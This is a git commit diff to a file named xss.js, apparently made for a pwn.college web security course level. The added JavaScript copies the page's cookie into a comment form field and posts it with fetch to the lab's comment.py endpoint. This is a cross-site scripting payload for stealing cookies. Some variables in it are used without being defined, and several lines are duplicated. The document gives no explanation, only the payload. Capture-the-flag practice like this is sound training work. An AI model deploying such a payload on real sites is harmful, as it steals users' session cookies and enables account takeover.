89689b55a051427728582c86754bbef49184ecf0
Pola Mikhail <pola.alper@gmail.com>
2021-02-26 10:30:09 +0000

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,4 +1,15 @@
+formData.append('comment', cookie);
+formData.append('submit', 'Submit your comment');
+fetch('http://cse545-web.pwn.college/~level07/cgi-bin/comment.py', { method: 'POST', body: formData, headers: {cookie: cookie}});
 
 document.addEventListener("DOMContentLoaded", function(){
-  document.forms[0].submit.addEventListener('click', function(){ document.forms[0]['comment'].value = document.cookie;}, false);
+  formData.append('comment', cookie);
+  formData.append('submit', 'Submit your comment');
+  fetch('http://cse545-web.pwn.college/~level07/cgi-bin/comment.py', { method: 'POST', body: formData, headers: {cookie: cookie}});
+  document.forms[0].submit.addEventListener('click', function(){
+    document.forms[0]['comment'].value = document.cookie;
+    formData.append('comment', cookie);
+formData.append('submit', 'Submit your comment');
+fetch('http://cse545-web.pwn.college/~level07/cgi-bin/comment.py', { method: 'POST', body: formData, headers: {cookie: cookie}});
+  }, false);
 });
